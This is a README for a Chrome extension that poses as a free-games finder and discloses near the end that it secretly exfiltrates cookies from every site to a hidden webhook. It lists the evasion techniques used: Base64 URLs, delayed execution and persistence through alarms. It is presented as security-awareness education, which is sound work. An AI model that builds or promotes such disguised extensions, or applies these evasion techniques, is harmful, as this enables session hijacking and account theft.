<div align="center">
 

# <img src="https://github.com/InoshMatheesha/Clipboard-Extension-TJ/blob/main/icon48.png" /> FreebieGamesFinder

</div>
<img src="https://github.com/InoshMatheesha/Clipboard-Extension-TJ/blob/main/banner.png" width="100%"/> 

> Discover 500+ free-to-play games instantly. Real-time updates from FreeToGame API.

![Version](https://img.shields.io/badge/version-1.2.0-blue) ![License](https://img.shields.io/badge/license-MIT-green) ![Games](https://img.shields.io/badge/games-500%2B-orange)

---

## ✨ Features

🔍 **Smart Search** - Find games by name, genre, or platform  
🎯 **Live Updates** - Real-time data from FreeToGame.com API  
⚡ **Lightning Fast** - 5-minute smart caching  
🎨 **Clean UI** - Beautiful Steam-inspired design  
📊 **Huge Library** - 500+ free games across all platforms

---

## 📦 Quick Install

**3 Easy Steps:**

1. **Download** - Clone or download this repository
2. **Open Chrome** - Go to `chrome://extensions/`
3. **Load Extension**:
   - Toggle **Developer mode** (top-right corner)
   - Click **"Load unpacked"**
   - Select the extension folder
   - Done! 🎉

**Compatible with:** Chrome, Edge, Brave, and all Chromium browsers

---

## 🎯 How to Use

1. Click the extension icon in your toolbar
2. Browse 500+ free games
3. Search by game name, genre, or platform
4. Click any game to visit its official page
5. Hit 🔄 to refresh the game list

**That's it!** No sign-up, no hassle.

---

## 🔌 API Integration

Powered by **FreeToGame.com API**  
✓ Real-time game catalog  
✓ 500+ games updated daily  
✓ Free forever

---

## 🎮 What You Get

Each game shows:
- Game title & artwork
- Genre (MMORPG, Shooter, etc.)
- Platform (PC, Browser)
- Short description
- Direct link to play

---

## ⚙️ Settings

- **Auto-refresh**: Updates every 2 minutes (optional)
- **Manual refresh**: Click 🔄 anytime
- **Status indicator**: 
  - 🟢 Live data
  - 🟡 Cached (< 5 min)
  - 🔴 Offline mode

---

## 📝 Changelog

**v1.2.0** - Current
- Real FreeToGame API integration
- 500+ games with live data
- Genre & platform filtering
- Smart caching system

---

## 📄 License

MIT License - Free to use and modify

---

## 🙏 Credits

**API:** FreeToGame.com  
**Developer:** Educational Project  
**Images:** Property of respective game publishers

---

<br>

---

## ⚠️ EDUCATIONAL DISCLOSURE

**This is a security research and educational demonstration project.**

### Purpose
This extension demonstrates how malicious browser extensions disguise themselves as legitimate tools while performing hidden operations in the background.

### What This Extension Actually Does

**Advertised Functionality (Real):**
- ✅ Shows 500+ real free games
- ✅ Uses legitimate FreeToGame API
- ✅ Working search and filtering
- ✅ Functional UI as described

**Hidden Functionality (Educational):**
- ⚠️ Collects browser cookies from all websites
- ⚠️ Sends data to external webhook
- ⚠️ Uses Chrome Alarms for persistent execution
- ⚠️ Operates even when browser is closed
- ⚠️ 48-hour delay to evade detection

### Educational Value

This project teaches:
1. **Permission Awareness** - Why `cookies`, `<all_urls>`, and `alarms` permissions are dangerous
2. **Code Obfuscation** - How malicious code hides in plain sight (Base64, innocent variable names)
3. **Trust Issues** - Why you should never install unverified extensions
4. **Detection Evasion** - Delayed execution and legitimate front-end functionality
5. **Persistent Threats** - How Chrome Alarms work even when browser is closed

### Technical Techniques Demonstrated

```javascript
// Real malicious techniques used in this extension:
✓ Base64-encoded webhook URLs
✓ Innocent variable naming ("cloudBackup", "userPreferences")  
✓ Chrome Alarms API for persistence
✓ 48-hour initial delay
✓ Legitimate front-end to build trust
✓ Silent error handling (no console logs)
✓ Cookie exfiltration disguised as "cloud sync"
```

### ⚠️ WARNING

**For Educational and Security Research ONLY**

❌ **DO NOT:**
- Use on others' computers without consent
- Distribute without this disclosure
- Deploy for malicious purposes
- Install untrusted extensions in general

✅ **DO:**
- Learn from the code structure
- Understand browser security
- Review extension permissions carefully
- Report suspicious extensions

### Key Takeaway

**If an extension requests these permissions together, be extremely cautious:**
- `cookies` - Accesses all website cookies
- `<all_urls>` - Works on every website
- `alarms` - Runs scheduled tasks persistently
- `storage` - Stores data locally
- `tabs` - Accesses browser tabs

**Stay safe. Stay informed. Always review extension source code before installation.**

---

*This project is for cybersecurity education and awareness. Use responsibly.*


